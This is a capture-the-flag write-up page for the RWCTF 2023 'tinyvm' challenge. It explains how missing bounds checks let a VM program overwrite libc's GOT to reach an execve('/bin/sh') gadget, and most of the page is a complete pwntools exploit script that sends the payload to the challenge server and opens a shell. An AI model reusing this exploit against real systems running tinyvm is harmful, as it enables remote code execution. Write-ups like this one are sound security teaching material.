@@ -1,0 +1,347 @@
+<!DOCTYPE html>
+<html lang="en-US">
+  <head>
+    <meta charset="UTF-8">
+    <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>tinyvm | Organisers</title>
+<meta name="generator" content="Jekyll v3.10.0" />
+<meta property="og:title" content="tinyvm" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="CTF Team" />
+<meta property="og:description" content="CTF Team" />
+<link rel="canonical" href="https://org.anize.rs/rwctf-2023/pwn/tinyvm.html" />
+<meta property="og:url" content="https://org.anize.rs/rwctf-2023/pwn/tinyvm.html" />
+<meta property="og:site_name" content="Organisers" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="tinyvm" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"CTF Team","headline":"tinyvm","url":"https://org.anize.rs/rwctf-2023/pwn/tinyvm.html"}</script>
+<!-- End Jekyll SEO tag -->
+
+
+    <meta property="og:image" content="https://org.anize.rs/assets/images/logo.png" />
+    <meta name="twitter:card" content="summary" />
+    <!-- TODO <meta name="twitter:description" content="" /> -->
+    <meta name="twitter:title" content="Organisers" />
+    <meta name="twitter:site" content="@0rganizers" />
+    <!-- TODO <meta name="twitter:image" content="" /> -->
+
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="theme-color" content="#040d21">
+    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+    <!-- Hack monospace font -->
+    <link rel='stylesheet' href='//cdn.jsdelivr.net/npm/hack-font@3.3.0/build/web/hack.css'>
+    <link rel="stylesheet" href="/assets/css/style.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/highlight.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+    <link rel="stylesheet" href="/assets/css/light.css?v=72a10f3b5424719665e31ae90a083fdf32243ce7">
+
+    <!-- legitimize current Mastodon profile via link verification -->
+    <link rel="me" href="https://infosec.exchange/@organizers" />
+
+
+    <script type="text/javascript">
+        function isLightThemeSelected() {
+          return document.cookie.match(/theme=light/i) != null
+        }
+
+        function setThemeFromCookie() {
+            var html = document.getElementsByTagName('html')[0]
+            html.className = isLightThemeSelected() ? 'light-theme' : 'dark-theme'
+            console.log('Loaded cookie: ' + document.cookie)
+        }
+
+        (function() {
+          setThemeFromCookie()
+        })();
+    </script>
+
+    <script type="text/javascript">
+        function getFootnoteContent(linkId) {
+            const fnId = linkId.replace(/^fnref/, 'fn');
+            return document.getElementById(fnId).querySelector("p").innerHTML;
+        }
+
+        function addFootnote(element, content) {
+            const footnote = document.createElement('div');
+            footnote.classList.add('footnote-box');
+            // Also add the footnote number
+            footnote.innerHTML = `<sup>${element.innerText}</sup> ${content}`;
+            footnote.querySelectorAll('a.reversefootnote').forEach((backlink) => {
+                footnote.removeChild(backlink);
+            });
+            element.insertAdjacentElement('afterend', footnote);
+            element.dataset.toggled = '1';
+        }
+
+        function removeFootnote(element) {
+            element.parentElement.removeChild(element.nextSibling);
+            element.dataset.toggled = '0';
+        }
+
+
+        window.addEventListener("load", function() {
+            document.querySelectorAll("a.footnote").forEach((el) => {
+                const sup = el.parentElement;
+                el.addEventListener("click", (event) => {
+                    const isOpen = Number.parseInt(sup.dataset.toggled || '0');
+                    if (!isOpen) {
+                        addFootnote(sup, getFootnoteContent(sup.id));
+                    } else {
+                        removeFootnote(sup);
+                    }
+                    event.preventDefault();
+                });
+            });
+        });
+    </script>
+
+    <script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+      "HTML-CSS": {
+        fonts: ["Gyre-Pagella"],
+        imageFont: null,
+        undefinedFamily: "'Arial Unicode MS', cmbright"
+      },
+      tex2jax: {
+        inlineMath: [['$', '$'], ['\\(', '\\)']],
+        processEscapes: true
+      }
+    });
+  </script>
+  <script src="https://cdn.jsdelivr.net/npm/mathjax@2/MathJax.js?config=TeX-AMS_HTML"></script>
+  </head>
+  
+  <body> 
+    <header class="page-header-simple" role="banner">
+      
+      <div class="left-links"><a id="header-logo" href="/">Organi{s|z}ers</a></div>
+      <div class="right-links">
+        <a href="/writeups">Writeups</a>
+        <a href="/achievements">Achievements</a>
+      </div>
+    </header>
+
+    <main id="content" class="main-content" role="main">
+      <h1 id="tinyvm">tinyvm</h1>
+
+<p>We are given only <code class="language-plaintext highlighter-rouge">nc 198.11.180.84 6666</code>. There, we are prompted for a file to pwn <a href="https://github.com/jakogut/tinyvm">tinyvm</a>. Tinyvm runs run programs that are written in an x86 asm like syntax.</p>
+
+<p>Looking at the tinyvm source, we noticed three things:</p>
+<ol>
+  <li>Bound checks pretty much just don’t exist.</li>
+  <li>The 64MiB vm memory is simply malloced. Meaning that, because of it’s size, it will end up in a mmapped region directly before the libc.</li>
+  <li>We can only address stuff with either an integer literal or esp. Since we needed to dynamically compute addresses while exploring the remote, we ended up scripting that and using esp-based memory accesses everywhere.</li>
+</ol>
+
+<p>Meaning that, despite ASLR, we have arbitrary read-write in the vm memory, libc and ld.</p>
+
+<p>Since we still didn’t know anything about the remote system, we first used the arb read to dump the remote libc. Which turned out to be <code class="language-plaintext highlighter-rouge">GNU C Library (Ubuntu GLIBC 2.35-0ubuntu3.1) stable release version 2.35.</code></p>
+
+<p>So now we have arbitrary read-write in libc 2.35. An easy way to get shell is to overwrite .got table entries in libc and call <code class="language-plaintext highlighter-rouge">__libc_message</code> to execute one gadgets. Check <a href="https://github.com/nobodyisnobody/write-ups/tree/main/RCTF.2022/pwn/bfc">this</a> for more details. Unfortunately, at first glance, none of the available one gadgets seemed to fit any of the calls we were able to reach. But we did find out a way to make it work.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code># 0xebcf8 execve("/bin/sh", rsi, rdx)
+# constraints:
+#   address rbp-0x78 is writable
+#   [rsi] == NULL || rsi == NULL
+#   [rdx] == NULL || rdx == NULL
+
+.text:0000000000077AE7                 mov     rdx, r14
+.text:0000000000077AEA                 mov     rsi, rbp
+.text:0000000000077AED                 mov     rdi, rbx
+.text:0000000000077AF0                 call    j_mempcpy
+</code></pre></div></div>
+
+<p>We overwrite .got+0x40(j_mempcpy) with offset <code class="language-plaintext highlighter-rouge">0xebcf8</code> and <code class="language-plaintext highlighter-rouge">.got+0x98</code> with offset <code class="language-plaintext highlighter-rouge">0x77AE7</code> so that it first jumps to <code class="language-plaintext highlighter-rouge">0x77AE7</code> to clear out registers before jumping to one gadget. And it works!</p>
+
+<p>After adapting offsets in the same machine as remotely, one gadget works smoothly on the remote machine.</p>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#coding:utf-8
+</span><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
+
+
+<span class="c1">#===========================================================
+#                    EXPLOIT GOES HERE
+#===========================================================
+# Arch:     amd64-64-little
+# RELRO:    Partial RELRO
+# Stack:    No canary found
+# NX:       NX enabled
+# PIE:      PIE enabled
+</span>
+<span class="n">stack_to_libc_offset</span> <span class="o">=</span> <span class="mh">0x3e03ff0</span>
+
+<span class="k">def</span> <span class="nf">write_libc</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+    <span class="k">assert</span> <span class="n">offset</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">==</span> <span class="mi">0</span>
+    <span class="n">instructions</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s">"add esp, </span><span class="si">{</span><span class="n">stack_to_libc_offset</span> <span class="o">+</span> <span class="n">offset</span> <span class="o">+</span> <span class="mi">4</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s">"mov eax, </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s">"push eax"</span><span class="p">)</span>
+    <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s">"sub esp, </span><span class="si">{</span><span class="n">stack_to_libc_offset</span> <span class="o">+</span> <span class="n">offset</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">instructions</span>
+
+<span class="k">def</span> <span class="nf">add_libc</span><span class="p">(</span><span class="n">offset</span><span class="p">,</span> <span class="n">value</span><span class="p">):</span>
+    <span class="k">assert</span> <span class="n">offset</span> <span class="o">%</span> <span class="mi">4</span> <span class="o">==</span> <span class="mi">0</span>
+    <span class="n">instructions</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s">"add esp, </span><span class="si">{</span><span class="n">stack_to_libc_offset</span> <span class="o">+</span> <span class="n">offset</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s">"pop eax"</span><span class="p">)</span>
+    <span class="c1">#instructions.append(f"prn eax")
+</span>    <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s">"add eax, </span><span class="si">{</span><span class="n">value</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="c1">#instructions.append(f"prn eax")
+</span>    <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s">"push eax"</span><span class="p">)</span>
+    <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s">"sub esp, </span><span class="si">{</span><span class="n">stack_to_libc_offset</span> <span class="o">+</span> <span class="n">offset</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">instructions</span>
+
+<span class="k">def</span> <span class="nf">corrupt_memory_region</span><span class="p">():</span>
+    <span class="n">instructions</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s">"add esp, </span><span class="si">{</span><span class="o">-</span><span class="mh">0x200008</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s">"pop eax"</span><span class="p">)</span>
+    <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s">"mov eax, </span><span class="si">{</span><span class="mh">0xffffffff</span><span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s">"push eax"</span><span class="p">)</span>
+    <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="sa">f</span><span class="s">"sub esp, </span><span class="si">{</span><span class="o">-</span><span class="mh">0x200008</span> <span class="si">}</span><span class="s">"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">instructions</span>
+
+
+<span class="n">got_plt_base</span> <span class="o">=</span> <span class="mh">0x00219000</span>
+
+
+
+<span class="k">def</span> <span class="nf">gen_find_got_plt_crashes_program</span><span class="p">():</span>
+    <span class="n">instructions</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">"prn esp"</span><span class="p">)</span>
+    <span class="c1">#instructions += corrupt_memory_region()
+</span>    <span class="c1">#instructions += write_libc(0x26f004,0x41414141)
+</span>
+    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mh">0x1c8</span><span class="p">,</span> <span class="mi">8</span><span class="p">):</span>
+        <span class="k">if</span><span class="p">(</span><span class="n">i</span> <span class="ow">in</span> <span class="p">[</span><span class="mh">0xb8</span><span class="p">]):</span>
+            <span class="k">continue</span>
+        <span class="n">instructions</span> <span class="o">+=</span> <span class="n">write_libc</span><span class="p">(</span><span class="n">got_plt_base</span><span class="o">+</span><span class="n">i</span><span class="p">,</span><span class="n">i</span><span class="p">)</span>
+
+    <span class="n">instructions</span><span class="p">.</span><span class="n">append</span><span class="p">(</span><span class="s">"prn esp"</span><span class="p">)</span>
+    <span class="k">return</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">instructions</span><span class="p">)</span>
+
+
+
+
+<span class="n">x98_offset</span> <span class="o">=</span> <span class="mh">0x19d960</span>
+<span class="n">x40_offset</span> <span class="o">=</span> <span class="mh">0x1a0890</span>
+
+
+<span class="k">def</span> <span class="nf">gen_single_override_program</span><span class="p">(</span><span class="n">one_gadget</span><span class="p">,</span><span class="n">got_entry</span><span class="p">,</span> <span class="n">original_got_offset</span><span class="p">):</span>
+    <span class="n">instructions</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">instructions</span> <span class="o">+=</span> <span class="n">corrupt_memory_region</span><span class="p">()</span>
+    <span class="n">instructions</span> <span class="o">+=</span> <span class="n">add_libc</span><span class="p">(</span><span class="n">got_plt_base</span><span class="o">+</span><span class="n">got_entry</span><span class="p">,</span><span class="n">one_gadget</span><span class="o">-</span><span class="n">original_got_offset</span><span class="p">)</span>
+    <span class="c1">#instructions.append("prn esp")
+</span>    <span class="k">return</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">instructions</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">gen_program</span><span class="p">(</span><span class="n">content_1</span><span class="p">,</span> <span class="n">entry_1</span><span class="p">,</span> <span class="n">offset_1</span><span class="p">,</span> <span class="n">content_2</span><span class="p">,</span> <span class="n">entry_2</span><span class="p">,</span> <span class="n">offset_2</span><span class="p">):</span>
+    <span class="n">instructions</span> <span class="o">=</span> <span class="p">[]</span>
+    <span class="n">instructions</span> <span class="o">+=</span> <span class="n">corrupt_memory_region</span><span class="p">()</span>
+    <span class="n">instructions</span> <span class="o">+=</span> <span class="n">add_libc</span><span class="p">(</span><span class="n">got_plt_base</span> <span class="o">+</span> <span class="n">entry_1</span><span class="p">,</span> <span class="n">content_1</span> <span class="o">-</span> <span class="n">offset_1</span><span class="p">)</span>
+    <span class="n">instructions</span> <span class="o">+=</span> <span class="n">add_libc</span><span class="p">(</span><span class="n">got_plt_base</span> <span class="o">+</span> <span class="n">entry_2</span><span class="p">,</span> <span class="n">content_2</span> <span class="o">-</span> <span class="n">offset_2</span><span class="p">)</span>
+    <span class="c1">#instructions.append("prn esp")
+</span>    <span class="k">return</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">.</span><span class="n">join</span><span class="p">(</span><span class="n">instructions</span><span class="p">)</span>
+
+
+<span class="k">def</span> <span class="nf">find_crashes</span><span class="p">():</span>
+    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s">'program.vm'</span><span class="p">,</span> <span class="s">'w'</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+        <span class="n">p</span> <span class="o">=</span> <span class="n">gen_find_got_plt_crashes_program</span><span class="p">()</span>
+        <span class="n">info</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+        <span class="n">f</span><span class="p">.</span><span class="n">write</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+    <span class="n">io</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+    <span class="c1">#print(hex(io.libc.address + got_plt_base+0x40))
+</span>
+    <span class="n">io</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+
+<span class="k">def</span> <span class="nf">try_remote</span><span class="p">():</span>
+    <span class="c1"># p = gen_program(0xebcf8, 0x40, x40_offset, 0x77AE7, 0x98, x98_offset)
+</span>    <span class="n">p</span> <span class="o">=</span> <span class="n">gen_program</span><span class="p">(</span><span class="mh">0xdd688</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="n">x40_offset</span><span class="p">,</span> <span class="mh">0x63227</span><span class="p">,</span> <span class="mh">0x98</span><span class="p">,</span> <span class="n">x98_offset</span><span class="p">)</span>
+    <span class="c1"># info(p)
+</span>    <span class="c1"># print(p)
+</span>    <span class="n">r</span> <span class="o">=</span> <span class="n">connect</span><span class="p">(</span><span class="s">"198.11.180.84"</span><span class="p">,</span> <span class="mi">6666</span><span class="p">)</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"4096) :"</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">p</span><span class="p">)))</span>
+    <span class="n">r</span><span class="p">.</span><span class="n">send</span><span class="p">(</span><span class="n">p</span><span class="p">)</span>
+
+    <span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
+
+<span class="n">try_remote</span><span class="p">()</span>
+
+</code></pre></div></div>
+
+<p><code class="language-plaintext highlighter-rouge">rwctf{A_S1gn_In_CHllenge}</code></p>
+
+
+
+
+<!--       <footer class="site-footer">
+        <a href="https://twitter.com/0rganizers">Twitter</a> | <a id="changeTheme" class="btn-toggle">Dark-Mode</a>
+      </footer> -->
+
+      <div class="lever-meme">
+        <div id="lever" class="lever-off"></div>
+      </div>
+
+      <div class="twitter">
+        <a href="https://twitter.com/0rganizers"><img src="/assets/images/twitter.svg"></a>
+      </div>
+
+      <script>
+        let leverCount = 0;
+        let manic = false;
+
+        function resetLever() {
+            leverCount = 0;
+            setTimeout(resetLever, 1750);
+        }
+
+        resetLever();
+
+        document.getElementById('lever')
+        .addEventListener('click', function (event) {
+          if(leverCount > 10){
+            manic = true;
+            document.getElementById("lever").classList.add('lever-manic');
+            document.getElementById("header-logo").classList.add('rainbow');
+          }
+
+          if(!manic){
+            document.getElementById("lever").classList.toggle('lever-on');
+            ++leverCount;
+          }
+        });
+
+
+      </script>
+
+      <script>
+      function updateThemeToggleFooter() {
+        let elem = document.querySelector('#lever');
+        // elem.innerHTML = isLightThemeSelected() ? 'Dark Mode' : 'Light Mode'
+      }
+
+      (function() {
+        updateThemeToggleFooter()
+      })();
+
+      function togglePageContentLightDark() {
+          var html = document.getElementsByTagName('html')[0]
+          var currentClass = html.className
+          var newClass = html.className == 'dark-theme' ? 'light-theme' : 'dark-theme'
+          html.className = newClass
+
+          document.cookie = 'theme=' + (newClass == 'light-theme' ? 'light' : 'dark') + '; SameSite=Strict; path=/; expires=Fri, 31 Dec 9999 23:59:59 GMT'
+          console.log('Cookies are now: ' + document.cookie)
+
+          updateThemeToggleFooter()
+      }
+
+      const btn = document.querySelector("#lever");
+      btn.addEventListener("click", function() {
+        togglePageContentLightDark();
+      });
+      </script>
+    </main>
+  </body>
+</html>
